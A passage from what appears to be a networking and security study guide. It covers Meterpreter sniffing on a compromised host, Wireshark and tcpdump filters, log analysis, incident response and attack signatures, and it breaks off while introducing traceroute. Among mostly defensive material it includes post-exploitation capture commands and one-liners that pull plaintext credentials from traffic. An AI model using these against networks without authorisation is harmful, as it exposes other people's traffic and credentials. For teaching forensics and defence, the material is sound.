proxychains4 -q nmap -sT 192.168.2.10              # Quiet mode
```

### Packet Capture from Compromised Host

```bash
# Linux
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 'host 192.168.1.100'
tcpdump -i eth0 'port 80 or port 443' -w http_capture.pcap

# Tshark (Wireshark CLI)
tshark -i eth0 -w capture.pcap
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# Meterpreter
meterpreter > run post/multi/gather/sniff_interfaces
meterpreter > use sniffer
meterpreter > sniffer_start 1              # Capture on interface 1
meterpreter > sniffer_dump 1 /tmp/sniff.pcap
meterpreter > sniffer_stop 1
```

---
# SECTION 11: Network Forensics

---

## 11.1 What Is Network Forensics?

Network forensics is the capture, recording, and analysis of network events to discover the source of security attacks or other problem incidents. Unlike traditional disk forensics, network data is transient — if you don't capture it in time, it's gone.

**Goals of network forensics:**
- Identify unauthorized access or data exfiltration
- Reconstruct attack timelines
- Attribute attacks to sources
- Gather evidence for legal proceedings
- Understand scope and impact of an incident
- Inform remediation and prevention

**Two primary approaches:**
- **"Catch-it-as-you-can":** Full packet capture at all times (storage-intensive)
- **"Stop-look-listen":** Capture only during suspected incidents

---

## 11.2 Evidence Collection Principles

### Chain of Custody

Every piece of evidence must be tracked from collection through presentation:
- **Who** collected it, **when**, **where**, **how**
- Document every person who handled evidence
- Store evidence securely (write-protected media, locked room)
- Create forensic copies — **never work on original evidence**
- Hashes verify evidence integrity (MD5, SHA-256)

### Order of Volatility

Collect most volatile evidence first (it disappears soonest):

1. **CPU registers, cache** — lost when process ends
2. **RAM (memory)** — lost when power off
3. **Network state** — active connections, ARP cache, routing tables
4. **Running processes** — current process list, open files
5. **Disk (temporary files, swap)** — survive reboots, can be overwritten
6. **Remote logging and monitoring data** — may roll over
7. **Physical media (HDD/SSD)** — most persistent
8. **Backup media, printed records** — longest lasting

### Network Evidence Sources

| Source | Type | Volatility |
|--------|------|-----------|
| Packet captures (pcap) | Full content | High (if live) / Low (if saved) |
| NetFlow/IPFIX records | Metadata only | Medium |
| Firewall logs | Connection records | Medium-Low |
| IDS/IPS alerts | Signature matches | Low |
| DHCP logs | IP-to-MAC assignments | Low |
| DNS logs | Name resolution history | Low |
| Syslog / Event logs | System events | Low |
| SIEM aggregated logs | Correlated events | Low |
| Web proxy logs | HTTP requests | Low |

---

## 11.3 Wireshark — Complete Reference

Wireshark is the most widely used network protocol analyzer. It captures and decodes packets in real time or from saved capture files.

### Installation and Interface

```bash
# Install
sudo apt install wireshark tshark
sudo usermod -aG wireshark $USER    # Allow non-root capture
newgrp wireshark

# Launch
wireshark                           # GUI
tshark                              # Command-line version
```

### Capture Filters (BPF Syntax)

Capture filters are applied **before** packets are captured — only matching packets are recorded.

```bash
# Host filters
host 192.168.1.100                  # Traffic to or from host
src host 192.168.1.100             # Traffic from host
dst host 192.168.1.100             # Traffic to host
not host 192.168.1.1               # Exclude host

# Network filters
net 192.168.1.0/24                  # Traffic in subnet
src net 10.0.0.0/8                 # From subnet
dst net 192.168.1.0/24             # To subnet

# Port filters
port 80                             # TCP or UDP port 80
src port 443                        # Source port 443
dst port 22                         # Destination port 22
portrange 8080-8090                 # Port range
not port 22                         # Exclude SSH

# Protocol filters
tcp                                 # TCP only
udp                                 # UDP only
icmp                                # ICMP only
arp                                 # ARP only
ip                                  # IPv4 only
ip6                                 # IPv6 only
not arp and not ip6                 # No ARP or IPv6

# Combinations
tcp and host 192.168.1.100          # TCP to/from specific host
tcp port 80 or tcp port 443         # HTTP or HTTPS
host 192.168.1.100 and not port 22  # Host, excluding SSH
src host 192.168.1.5 and dst port 80  # HTTP from specific host
```

### Display Filters (Wireshark Syntax)

Display filters are applied **after** capture — filter what's shown from captured packets.

```bash
# IP address filters
ip.addr == 192.168.1.100           # Either direction
ip.src == 192.168.1.100            # Source
ip.dst == 192.168.1.100            # Destination
ip.addr == 192.168.1.0/24          # Subnet
!(ip.addr == 192.168.1.1)          # Exclude

# TCP/UDP port filters
tcp.port == 80                      # Either direction
tcp.srcport == 443
tcp.dstport == 22
udp.port == 53
tcp.port in {80 443 8080 8443}     # Multiple ports

# Protocol filters (just type protocol name)
http                                # HTTP
https (actually: tls or ssl)        # HTTPS (decoded as TLS)
dns                                 # DNS
dhcp                                # DHCP (or bootp)
arp                                 # ARP
icmp                                # ICMP
icmpv6                              # ICMPv6
smtp                                # SMTP
ftp                                 # FTP
ssh                                 # SSH
rdp                                 # RDP
smb or smb2                        # SMB
ldap                                # LDAP
kerberos                            # Kerberos

# TCP flags
tcp.flags.syn == 1                  # SYN packets
tcp.flags.fin == 1                  # FIN packets
tcp.flags.rst == 1                  # RST packets
tcp.flags.syn == 1 and tcp.flags.ack == 0  # SYN only (new connections)
tcp.analysis.retransmission        # Retransmissions
tcp.analysis.duplicate_ack        # Duplicate ACKs (congestion)

# HTTP filters
http.request.method == "POST"      # HTTP POST requests
http.request.uri contains "login"  # URLs with "login"
http.response.code == 200          # HTTP 200 OK
http.response.code >= 400          # HTTP errors
http.host == "example.com"         # Specific host
http.cookie contains "session"     # Cookies with session

# DNS filters
dns.qry.name == "example.com"      # DNS query for domain
dns.qry.type == 1                  # A record queries
dns.flags.rcode != 0               # DNS errors (not NOERROR)
dns.resp.name contains "malware"   # Response with suspicious name

# Content filters
frame contains "password"           # Any frame containing text
tcp contains "USER"                 # TCP payload containing USER (FTP login)
http.request.uri contains "shell"  # Shell in URL (webshell attempt?)
data contains 66:65:65             # Hex bytes in data

# Length-based
frame.len > 1400                   # Large frames (possible data exfil)
ip.len == 0                        # IP length 0 (scanning trick)
tcp.len > 0                        # TCP packets with payload (not pure ACKs)

# Time-based (relative to start of capture)
frame.time_relative > 10 and frame.time_relative < 20  # Specific time window

# Combinations
ip.src == 192.168.1.5 and http.request.method == "POST"
dns.qry.name matches ".*\.ru$"     # DNS queries for .ru domains
tcp.flags.syn == 1 and ip.src != 192.168.1.0/24  # External SYN packets (inbound)

# Useful for intrusion analysis
tcp.analysis.flags                  # Any TCP analysis flag
!tcp.analysis.flags                 # Healthy TCP (no issues)
tcp.analysis.zero_window            # Zero window (receiver buffer full)
tcp.analysis.window_full            # Sender filling window
```

### Wireshark GUI Features

**Follow stream:**
- Right-click packet → Follow → TCP Stream / UDP Stream / HTTP Stream
- Shows complete conversation in human-readable form
- Great for seeing credentials, commands, file contents

**Statistics menu:**
- **Conversations:** All unique src/dst IP pairs with byte counts
- **Protocol Hierarchy:** Breakdown of protocols by percentage
- **IO Graphs:** Plot traffic over time (visualize spikes)
- **Endpoints:** List all unique IP/MAC addresses
- **HTTP requests:** All HTTP requests with timing

**Expert Information (Analyze menu):**
- Shows Wireshark-detected issues (errors, warnings, notes)
- Retransmissions, duplicate ACKs, RSTs, zero-window warnings

**Name Resolution:**
- Edit → Preferences → Name Resolution
- Enable DNS resolution to see hostnames instead of IPs

**Coloring Rules:**
- View → Coloring Rules
- Red = RST packets (connection resets)
- Dark red = checksum errors
- Blue = DNS queries

### Wireshark for Security Analysis

**Find credentials in traffic:**
```
# FTP credentials (plaintext)
ftp contains "PASS"
# Or: Follow TCP stream on port 21

# HTTP Basic Auth
http.authorization contains "Basic"
# Decode: base64(username:password)

# Telnet (all plaintext)
telnet
# Follow TCP stream to see entire session

# SMTP AUTH
smtp contains "AUTH"
smtp contains "MAIL FROM"

# POP3 credentials
pop.request.command == "USER" or pop.request.command == "PASS"
```

**Detect scanning:**
```
# Port scan (many SYNs, no data)
tcp.flags == 0x002                 # SYN only
# Look for: one source IP, many destination ports, no SYN-ACK responses

# ICMP sweep
icmp.type == 8                     # Echo requests
# Look for: one source, many destinations

# UDP scan
udp and icmp.type == 3            # UDP probe + ICMP port unreachable responses
```

**Detect ARP poisoning:**
```
arp                                # Show all ARP traffic
# Look for:
# 1. ARP replies without corresponding requests (gratuitous ARP)
# 2. Multiple MAC addresses claiming the same IP
# 3. One MAC claiming to be many different IPs
```

**Detect DNS tunneling:**
```
dns
# Look for:
# - Very long DNS query names (data encoded in subdomains)
# - High frequency of DNS queries (data stream)
# - Unusual TXT record content
# - Queries for random-looking subdomains
dns.qry.name.len > 50             # Suspiciously long domain names
dns.resp.type == 16               # TXT record responses (common for exfil)
```

**Detect data exfiltration:**
```
# Large outbound transfers
ip.dst != 192.168.1.0/24          # Outbound traffic
frame.len > 1400                   # Large packets

# Statistics → Conversations (sort by bytes to see who is sending most data)
# Statistics → IO Graphs (look for sustained high throughput spikes)
```

---

## 11.4 Tcpdump Reference

Command-line packet analyzer — essential when no GUI is available.

```bash
# Basic capture
tcpdump -i eth0                    # Capture on eth0
tcpdump -i any                     # All interfaces
tcpdump -i eth0 -n                 # No hostname resolution
tcpdump -i eth0 -nn                # No hostname or port resolution
tcpdump -i eth0 -v                 # Verbose (more detail)
tcpdump -i eth0 -vv                # Very verbose
tcpdump -i eth0 -X                 # Show hex and ASCII payload
tcpdump -i eth0 -A                 # Show ASCII payload only
tcpdump -i eth0 -e                 # Show Ethernet header (MAC addresses)

# Save and read captures
tcpdump -i eth0 -w capture.pcap   # Save to file
tcpdump -r capture.pcap            # Read from file
tcpdump -r capture.pcap -n         # Read with no resolution
tcpdump -r capture.pcap | grep "GET"   # Pipe to grep

# Packet count and size
tcpdump -i eth0 -c 100             # Capture 100 packets then stop
tcpdump -i eth0 -s 0               # Full packet capture (no truncation)
tcpdump -i eth0 -s 65535           # Same — capture full packets

# Rotating capture files (useful for long-term capture)
tcpdump -i eth0 -G 3600 -w /captures/capture-%Y%m%d%H%M%S.pcap -z gzip
# -G = rotate every 3600 seconds, -z = compress with gzip

# Filters (BPF syntax — same as Wireshark capture filters)
tcpdump -i eth0 host 192.168.1.100
tcpdump -i eth0 src 192.168.1.100
tcpdump -i eth0 dst 192.168.1.100
tcpdump -i eth0 port 80
tcpdump -i eth0 portrange 8080-8090
tcpdump -i eth0 net 192.168.1.0/24
tcpdump -i eth0 tcp
tcpdump -i eth0 udp
tcpdump -i eth0 icmp
tcpdump -i eth0 not arp
tcpdump -i eth0 'tcp port 80 or tcp port 443'
tcpdump -i eth0 'host 192.168.1.100 and port 22'
tcpdump -i eth0 'not port 22 and not port 53'

# TCP flag filtering
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'           # SYN packets
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn'  # SYN only
tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0'           # RST packets
tcpdump -i eth0 'tcp[tcpflags] & tcp-fin != 0'           # FIN packets

# Packet content matching
tcpdump -i eth0 -A 'tcp port 80' | grep "GET\|POST\|Host:"
tcpdump -i eth0 'tcp[20:4] = 0x47455420'  # Hex for "GET "

# Useful one-liners
# Capture HTTP traffic and show URLs
tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -oP '(?<=GET |POST )[^ ]+'

# Show all unique source IPs
tcpdump -i eth0 -n 'not src net 192.168.1.0/24' | awk '{print $3}' | sort | uniq -c | sort -rn

# Monitor DNS queries
tcpdump -i eth0 -n port 53 -A 2>/dev/null | grep -E "A\?|AAAA\?"

# Capture DHCP traffic
tcpdump -i eth0 -n port 67 or port 68

# Watch for SSH brute force (many connections to port 22)
tcpdump -i eth0 -n 'tcp[tcpflags] == tcp-syn and dst port 22' | \
  awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -rn
```

---

## 11.5 Tshark (Wireshark CLI)

Tshark is the command-line version of Wireshark. Supports Wireshark display filter syntax.

```bash
# Basic capture
tshark -i eth0                     # Live capture
tshark -r capture.pcap             # Read file
tshark -r capture.pcap -V         # Verbose (all protocol details)

# Display filters (same as Wireshark GUI)
tshark -i eth0 -Y "http.request.method == POST"
tshark -r capture.pcap -Y "dns.qry.name contains malware"

# Extract specific fields
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport
tshark -r capture.pcap -T fields -e http.request.uri -Y "http.request"
tshark -r capture.pcap -T fields -e dns.qry.name -Y "dns.qry.name"
tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport -E separator=,

# Output formats
tshark -r capture.pcap -T json     # JSON output
tshark -r capture.pcap -T json | jq '.[].ip.src'   # Parse with jq
tshark -r capture.pcap -T pdml     # XML/PDML format
tshark -r capture.pcap -T tabs     # Tab-separated

# Statistics
tshark -r capture.pcap -q -z io,stat,1           # IO stats per second
tshark -r capture.pcap -q -z conv,tcp            # TCP conversations
tshark -r capture.pcap -q -z proto,colinfo,ip,ip.addr  # Protocol info
tshark -r capture.pcap -q -z http,tree           # HTTP request tree
tshark -r capture.pcap -q -z dns,tree            # DNS statistics

# Follow streams
tshark -r capture.pcap -q -z follow,tcp,ascii,0  # Follow stream 0 as ASCII
tshark -r capture.pcap -q -z follow,tcp,hex,0    # Follow stream 0 as hex

# Capture with file rotation
tshark -i eth0 -b filesize:102400 -b files:10 -w /tmp/capture.pcap
# Rotate at 100MB, keep last 10 files

# Credential hunting
tshark -r capture.pcap -Y "ftp contains PASS" -T fields -e ftp.request.arg
tshark -r capture.pcap -Y "http.authbasic" -T fields -e http.authbasic
tshark -r capture.pcap -Y "telnet" -T fields -e telnet.data

# Find large data transfers
tshark -r capture.pcap -q -z conv,ip | sort -k 5 -rn | head -20

# Detect port scanning
tshark -r capture.pcap -q -z endpoints,tcp | sort -k 2 -rn
```

---

## 11.6 Network Log Analysis

### Firewall Log Analysis

**iptables / nftables log format:**
```
Jan 15 10:23:45 fw01 kernel: [12345.678] IN=eth0 OUT= MAC=aa:bb:cc:dd:ee:ff:11:22:33:44:55:66:08:00 
SRC=203.0.113.100 DST=192.168.1.10 LEN=44 TOS=0x00 PREC=0x00 TTL=50 ID=12345 PROTO=TCP 
SPT=54321 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0

# Fields:
# IN/OUT = interface direction
# SRC/DST = source/destination IP
# PROTO = protocol
# SPT/DPT = source/destination port
# SYN = TCP SYN flag set
```

**Analyzing firewall logs:**
```bash
# Count dropped connections by source IP (potential scanner)
grep "DPT=22" /var/log/iptables.log | grep "SYN" | \
  awk '{print $8}' | cut -d= -f2 | sort | uniq -c | sort -rn | head -20

# Find all unique destination ports being probed
grep "IN=eth0" /var/log/iptables.log | \
  awk '{print $23}' | cut -d= -f2 | sort -n | uniq -c | sort -rn

# Check for specific attack patterns
grep "DPT=3389" /var/log/iptables.log | grep "SYN" | wc -l  # RDP scan attempts
grep "DPT=445" /var/log/iptables.log | wc -l               # SMB probes
```

### Web Server Log Analysis

**Apache/Nginx access log format:**
```
203.0.113.100 - alice [15/Jan/2024:10:23:45 +0000] "GET /admin/config.php HTTP/1.1" 
200 1234 "https://example.com" "Mozilla/5.0 (..."

# Fields: IP, ident, user, time, request, status, bytes, referer, user-agent
```

**Log analysis commands:**
```bash
# Top 10 source IPs by request count
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -10

# Failed login attempts (HTTP 401)
grep " 401 " /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn

# Suspicious user agents
grep -i "sqlmap\|nikto\|nessus\|masscan\|nmap\|burpsuite\|hydra\|metasploit" \
  /var/log/nginx/access.log

# Web application attack patterns
grep -E "union.*select|' OR|1=1|<script>|\.\.\/\.\.\/" /var/log/nginx/access.log

# Large downloads (potential data exfiltration)
awk '$10 > 10000000 {print $0}' /var/log/nginx/access.log  # > 10MB responses

# 404 errors (scanning/probing)
grep " 404 " /var/log/nginx/access.log | awk '{print $7}' | sort | uniq -c | sort -rn | head -20

# Requests from specific country (using geoip)
geoiplookup 203.0.113.100
# Or: with MaxMind GeoIP database

# Timeline of attack
grep "203.0.113.100" /var/log/nginx/access.log | awk '{print $4}' | \
  cut -d: -f1,2 | sort | uniq -c
```

### DNS Log Analysis

```bash
# Analyze BIND/named query logs
# /var/log/named/query.log format:
# client 192.168.1.100#54321 (example.com): query: example.com IN A

# Most queried domains
awk '/query:/ {print $8}' /var/log/named/query.log | sort | uniq -c | sort -rn | head -20

# Clients making most requests
awk '/query:/ {print $2}' /var/log/named/query.log | cut -d# -f1 | sort | uniq -c | sort -rn

# NXDOMAIN (non-existent) responses (potential DGA/botnet)
grep "NXDOMAIN" /var/log/named/query.log | awk '{print $8}' | sort | uniq -c | sort -rn | head -20

# Detect DNS tunneling (long queries)
awk '/query:/ {if (length($8) > 50) print $0}' /var/log/named/query.log

# Queries for unusual TLDs
awk '/query:/ {print $8}' /var/log/named/query.log | rev | cut -d. -f1 | rev | \
  sort | uniq -c | sort -rn | grep -v "com\|net\|org\|edu\|gov\|io"
```

### DHCP Log Analysis

```bash
# ISC DHCP server log (/var/log/dhcpd.log)
# Example entries:
# DHCPREQUEST for 192.168.1.100 from aa:bb:cc:dd:ee:ff via eth0
# DHCPACK on 192.168.1.100 to aa:bb:cc:dd:ee:ff (hostname) via eth0

# Build IP-to-MAC mapping at specific time
grep "DHCPACK" /var/log/dhcpd.log | grep "Jan 15" | \
  awk '{print $8, $10, $11}' | sort | uniq

# Find all IPs assigned to a specific MAC
grep "aa:bb:cc:dd:ee:ff" /var/log/dhcpd.log | grep "DHCPACK"

# Find MAC for a specific IP at a specific time
grep "192.168.1.100" /var/log/dhcpd.log | grep "DHCPACK" | tail -20

# Detect MAC address changes (same IP, different MAC = possible spoofing)
grep "DHCPACK" /var/log/dhcpd.log | grep "192.168.1.100" | \
  awk '{print $10}' | sort | uniq
```

### Syslog Analysis

```bash
# Authentication failures (Linux)
grep "Failed password" /var/log/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn | head -20  # By source IP

grep "Failed password" /var/log/auth.log | \
  awk '{print $9}' | sort | uniq -c | sort -rn              # By username

# Successful logins after failures (potential brute force success)
grep "Accepted password" /var/log/auth.log

# Sudo usage
grep "sudo" /var/log/auth.log | grep "COMMAND"

# New user creation
grep "useradd\|adduser" /var/log/auth.log

# Windows Event Log analysis
# Event IDs to monitor:
# 4624 - Successful logon
# 4625 - Failed logon
# 4634 - Logoff
# 4648 - Explicit credentials logon
# 4672 - Special privileges assigned
# 4688 - Process created
# 4698 - Scheduled task created
# 4720 - User account created
# 4728 - Member added to security group
# 4768 - Kerberos authentication request (TGT)
# 4769 - Kerberos service ticket request (TGS)
# 4771 - Kerberos pre-authentication failed
# 4776 - NTLM authentication
# 5140 - Network share accessed
# 7045 - Service installed

# Parse Windows event logs on Linux
wevtutil qe Security /format:text /q:"*[System/EventID=4625]"  # On Windows
python3-evtx /mnt/windows/System32/winevt/Logs/Security.evtx   # On Linux

# Look for Kerberos attacks
# AS-REP Roasting: EventID 4768 with no pre-auth (etype 23)
# Pass-the-ticket: TGS requests without prior TGT
# Kerberoasting: Unusual TGS requests for service accounts
```

---

## 11.7 Incident Response — Network Focus

### Network IR Process

**1. Preparation**
- Deploy packet capture sensors (TAPs, SPAN ports)
- Configure NetFlow collection
- Ensure log aggregation (SIEM)
- Document normal traffic baselines
- Prepare forensic tools and jump bag

**2. Detection and Analysis**
```bash
# Quick triage — identify scope
netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn
# Find: unusual external connections, many connections to one host

# Check for unusual listening ports
netstat -tlnp
ss -tlnp

# Identify all network connections of suspicious process
lsof -i -p <PID>
netstat -np | grep <PID>

# DNS exfiltration check
tcpdump -i eth0 udp port 53 -nn -A | grep -E "\.{40,}"  # Long DNS queries

# Check for large outbound transfers (last 24 hours)
vnstat -h                          # By hour
iftop -i eth0 -n                   # Real-time

# Look for connections to known bad IPs
# Download threat intel feed
wget https://feodotracker.abuse.ch/downloads/ipblocklist.txt
# Check connections against it
netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | \
  while read ip; do grep "^$ip" ipblocklist.txt && echo "MATCH: $ip"; done
```

**3. Containment**
```bash
# Block suspicious IP at firewall
iptables -I INPUT -s 203.0.113.100 -j DROP
iptables -I OUTPUT -d 203.0.113.100 -j DROP

# Isolate compromised host (block all traffic except forensics)
iptables -I FORWARD -s 192.168.1.50 -j DROP
iptables -I FORWARD -d 192.168.1.50 -j DROP
# Or: disable port on switch
SW1(config)# interface fa0/10
SW1(config-if)# shutdown

# Capture traffic during containment
tcpdump -i eth0 -w /forensics/incident-$(date +%Y%m%d%H%M%S).pcap &
```

**4. Evidence Collection**
```bash
# Capture RAM (most volatile)
# Using LiME (Linux Memory Extractor)
insmod lime-$(uname -r).ko "path=/forensics/memory.lime format=lime"

# Network state
netstat -an > /forensics/netstat.txt
arp -a > /forensics/arp.txt
ip route > /forensics/routes.txt
ss -anp > /forensics/sockets.txt
cat /proc/net/tcp > /forensics/tcp_connections.txt

# Capture active connections' traffic
for ip in $(netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort -u); do
  tcpdump -i eth0 -w /forensics/conn-$ip.pcap host $ip -c 10000 &
done

# Hash all evidence files
sha256sum /forensics/* > /forensics/hashes.sha256
```

**5. Analysis**
```bash
# Timeline reconstruction
# Extract timestamps from pcap
tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport \
  -E separator=, > timeline.csv

# DNS query timeline (detect DGA — fast-flux domain generation)
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e frame.time -e ip.src -e dns.qry.name | \
  awk '{print $1, $2, $3}' | sort > dns_timeline.txt

# HTTP request timeline
tshark -r capture.pcap -Y "http.request" -T fields \
  -e frame.time -e ip.src -e http.host -e http.request.uri | sort > http_timeline.txt

# Extract files from pcap
tcpflow -r capture.pcap -o /forensics/files/   # Extract TCP streams
networkminer capture.pcap                       # GUI file extraction

# Wireshark file export: File → Export Objects → HTTP (or SMB, DICOM, etc.)
```

**6. IOC (Indicators of Compromise) Extraction**
```bash
# Extract all unique IPs from pcap
tshark -r capture.pcap -T fields -e ip.src -e ip.dst | tr '\t' '\n' | sort -u > ips.txt

# Extract domains from DNS queries
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort -u > domains.txt

# Extract URLs
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri | \
  awk '{print "http://"$1$2}' | sort -u > urls.txt

# Extract User-Agents
tshark -r capture.pcap -Y "http.request" -T fields -e http.user_agent | sort | uniq -c | sort -rn

# Extract file hashes (if file transfers captured)
# After extracting files with tcpflow:
sha256sum /forensics/files/* | tee file_hashes.txt

# Check hashes against VirusTotal
while read hash filename; do
  result=$(curl -s "https://www.virustotal.com/vtapi/v2/file/report?apikey=YOUR_KEY&resource=$hash")
  echo "$hash: $(echo $result | jq '.positives')/$(echo $result | jq '.total')"
done < file_hashes.txt

# Check IPs/domains against threat intel
while read ip; do
  response=$(curl -s "https://api.abuseipdb.com/api/v2/check?ipAddress=$ip" \
    -H "Key: YOUR_KEY" -H "Accept: application/json")
  score=$(echo $response | jq '.data.abuseConfidenceScore')
  if [ "$score" -gt "50" ]; then
    echo "MALICIOUS: $ip (score: $score)"
  fi
done < ips.txt
```

---

## 11.8 Network Forensics Tools Summary

| Tool | Purpose | Key Use |
|------|---------|---------|
| **Wireshark** | Packet capture and analysis | Deep protocol inspection, follow streams |
| **tcpdump** | CLI packet capture | Remote capture, scripted analysis |
| **tshark** | CLI Wireshark | Batch analysis, field extraction |
| **NetworkMiner** | Passive analyzer | Extract files, credentials, sessions from pcap |
| **Zeek (Bro)** | Network security monitor | Generate logs from traffic, detect anomalies |
| **Suricata** | IDS/IPS + NSM | Alert generation, pcap analysis |
| **Snort** | IDS/IPS | Signature-based detection |
| **Arkime (Moloch)** | Full packet capture system | Long-term capture storage and search |
| **Security Onion** | NSM platform | Combines Zeek, Suricata, Elasticsearch |
| **RITA** | Beacon detection | Find C2 beaconing in Zeek logs |
| **tcpflow** | TCP stream extractor | Extract file transfers from pcap |
| **ngrep** | Grep for network packets | Search packet payload for patterns |
| **dsniff** | Password sniffer suite | Capture cleartext credentials |
| **ettercap** | MITM attack tool | ARP poison, credential capture |
| **Volatility** | Memory forensics | Extract network artifacts from RAM dumps |

### Zeek (Bro) Log Analysis

```bash
# Zeek generates structured logs automatically
# Key log files:
# conn.log - All connections (start, end, bytes, protocol)
# dns.log - DNS queries and responses
# http.log - HTTP requests and responses
# ssl.log - SSL/TLS connections
# files.log - File transfers
# weird.log - Unusual/unexpected protocol behavior

# Analyze conn.log
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto duration | \
  sort -k3 -n | tail -20                    # Longest connections

# Find external connections
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto orig_bytes | \
  awk '$1 !~ /^192\.168\.|^10\.|^172\.(1[6-9]|2[0-9]|3[0-1])\./ {print}' | \
  sort -k5 -rn | head -20                   # Largest external transfers

# DNS analysis
cat dns.log | zeek-cut id.orig_h query qtype_name answers | grep -v "192.168\."

# HTTP suspicious paths
cat http.log | zeek-cut id.orig_h id.resp_h uri method user_agent | \
  grep -E "\.php\?|shell|cmd|exec|passwd"

# RITA (Real Intelligence Threat Analytics) for beacon detection
rita import /opt/zeek/logs/current/ my-dataset
rita show-beacons my-dataset | head -20
rita show-bl-hostnames my-dataset | head -20
```

---

## 11.9 Common Attack Signatures in Network Traffic

### Reconnaissance Signatures

```
# Nmap SYN scan:
- Many SYN packets from one source to many destination ports
- Most get RST back (no service listening)
- Very short inter-packet delay
- Source port often changes each probe

# UDP scan:
- UDP packets to many ports
- ICMP port unreachable responses back from target
- DNS, DHCP, SNMP ports usually open

# OS fingerprinting:
- Unusual TCP flag combinations (FIN only, Xmas, Null)
- Nmap's test probes: ECE, CWR flags, unusual options
```

### Brute Force Signatures

```
# SSH brute force:
- Many TCP connections to port 22 from same source
- Each connection very short (< 5 seconds)
- Pattern: connect → auth → fail → disconnect → repeat
- Filter: tcp.flags.syn == 1 and tcp.dstport == 22

# HTTP brute force:
- Many POST requests to same URL (login page)
- Same User-Agent string
- Rapid succession (hundreds per minute)
```

### Data Exfiltration Signatures

```
# DNS tunneling:
- DNS TXT queries with base64 content
- Long subdomain labels (> 40 chars each)
- High DNS query volume from single host
- Responses to unknown domains

# ICMP tunneling:
- ICMP echo requests with large/unusual payloads
- Non-standard ICMP payload length
- High volume, sustained pattern

# HTTP exfiltration:
- Large POST requests to unusual hosts
- Base64 data in URL parameters
- Unusual destination countries

# Encrypted exfiltration:
- New TLS connections to unusual hosts
- High volume to residential IPs
- Connections at unusual hours
```

### Lateral Movement Signatures

```
# SMB spreading (like WannaCry/NotPetya):
- Connection from workstation to many other workstations on port 445
- SMB traffic between workstations (should only go to servers)
- Large volume of failed SMB authentications

# Pass-the-Hash:
- Successful SMB authentication without prior NTLM challenge
- Rapid lateral movement to many hosts
- Service account used from unusual source

# Kerberoasting:
- Service ticket requests for many different SPNs from one client
- Tickets requested with RC4 (etype 23) instead of AES
- No corresponding pre-authentication tickets
```

---
# SECTION 12: Network Troubleshooting Tools and Methodology

---

## 12.1 Troubleshooting Methodology

### CompTIA 7-Step Method

1. **Identify the problem** — Gather information, question users, identify symptoms, duplicate the problem, approach multiple problems individually
2. **Establish a theory of probable cause** — Question the obvious; consider multiple approaches
3. **Test the theory** — Confirm or deny the theory; if not confirmed, re-establish a new theory
4. **Establish a plan of action** — Resolve the problem with minimal impact on users
5. **Implement the solution or escalate** — Apply fix; if unable, escalate to next tier
6. **Verify full system functionality** — Confirm the fix worked; implement preventive measures
7. **Document findings, actions, and outcomes** — Record for future reference

### OSI-Layer Troubleshooting Approach

**Bottom-Up (Physical → Application):** Start at Layer 1; good when issue seems physical or you have no clues.

**Top-Down (Application → Physical):** Start at Layer 7; good when application-specific issue.

**Divide-and-Conquer:** Start in the middle (Layer 3/4); ping tests tell you if physical and data-link are OK.

**Follow-the-Path:** Trace the path a packet takes from source to destination.

**Compare Configurations:** Compare working vs non-working device configs.

**Swap Components:** Replace suspected faulty hardware to isolate.

### Common Questions to Ask Users

- What exactly is the problem? (Be specific)
- When did it start?
- What changed recently? (New software, config change, hardware)
- Who else is affected? (One user, a department, everyone)
- Can you reproduce it? Is it intermittent?
- What have you already tried?
- Does it work from a different device/location?

---

## 12.2 Command-Line Troubleshooting Tools

### ping — Basic Connectivity Test

`ping` sends ICMP Echo Request packets and waits for ICMP Echo Reply.

```bash
# Linux
ping 8.8.8.8                          # Default (infinite)
ping -c 4 8.8.8.8                     # Send 4 packets
ping -c 4 -i 0.2 8.8.8.8             # 0.2s interval (faster)
ping -c 100 -q 8.8.8.8               # 100 packets, quiet output
ping -s 1472 8.8.8.8                  # 1472-byte payload (1500 MTU - 28 headers)
ping -M do -s 1472 8.8.8.8           # Don't fragment (path MTU discovery)
ping -t 5 8.8.8.8                     # TTL=5 (traceroute-like behavior)
ping -I eth0 8.8.8.8                  # Send from specific interface
ping -6 2001:4860:4860::8888          # IPv6 ping
ping6 ::1                             # IPv6 loopback

# Windows
ping 8.8.8.8                          # 4 packets by default
ping -t 8.8.8.8                       # Continuous (Ctrl+C to stop)
ping -n 10 8.8.8.8                    # 10 packets
ping -l 1472 8.8.8.8                  # Payload size 1472
ping -f -l 1472 8.8.8.8              # Don't fragment
ping -6 2001:4860:4860::8888          # IPv6

# Interpreting results
# ! = Success
# . = Timeout (no reply)
# U = Unreachable (ICMP Unreachable received)
# Request timeout  = ICMP not getting back (firewall? routing issue?)
# Destination host unreachable = No route to host
# TTL expired in transit = Loop or too many hops
```

**Reading ping statistics:**
```
--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 10.123/11.456/13.789/1.234 ms

# packet loss > 0% = congestion or link issues
# high mdev (variation) = jitter (bad for VoIP)
# high RTT = congestion, long path, or processing delay
```

### traceroute / tracert — Path Discovery

`traceroute` reveals the path packets take by sending packets with incrementing TTL values.

```bash
